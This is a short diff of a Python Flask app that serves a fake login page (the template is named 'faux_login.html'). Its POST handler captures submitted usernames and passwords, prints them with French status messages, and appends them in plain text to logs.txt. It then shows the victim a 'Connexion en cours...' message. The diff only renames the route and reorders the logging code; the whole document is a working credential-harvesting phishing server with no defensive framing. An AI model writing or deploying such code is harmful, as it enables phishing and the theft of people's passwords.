@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template
+import os
 
 app = Flask(__name__)
 
@@ -6,23 +7,20 @@ app = Flask(__name__)
 def home():
     return render_template('faux_login.html')
 
-@app.route('/faux_login', methods=['POST'])
+@app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
 
-    # Enregistrer les identifiants dans logs.txt
-    with open("logs.txt", "a") as f:
-        f.write(f"Username: {username} | Password: {password}\n")
-
     print(f"[+] Nom d'utilisateur reçu : {username}")
     print(f"[+] Mot de passe reçu : {password}")
+
+    # Sauvegarder dans un fichier (logs.txt)
+    with open("logs.txt", "a") as f:
+        f.write(f"Username: {username} | Password: {password}\n")
 
     return "<h1>Connexion en cours...</h1>"
 
 if __name__ == '__main__':
-    import os
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
-
-
